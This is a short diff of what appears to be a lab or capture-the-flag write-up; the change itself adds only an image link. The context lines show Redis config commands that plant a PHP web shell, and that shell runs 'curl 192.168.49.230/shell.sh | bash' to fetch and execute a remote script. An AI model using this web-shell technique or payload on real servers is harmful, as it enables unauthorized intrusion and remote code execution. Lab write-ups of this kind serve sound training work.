@@ -196,6 +196,9 @@ config set dir /opt/redis-files
 config set dbfilename test.php
 set test "<?php system('curl 192.168.49.230/shell.sh | bash'); ?>"
 
+![](Pasted%20image%2020221101091609.png)
+
+
 ---
 
 # Lateral Movement to user
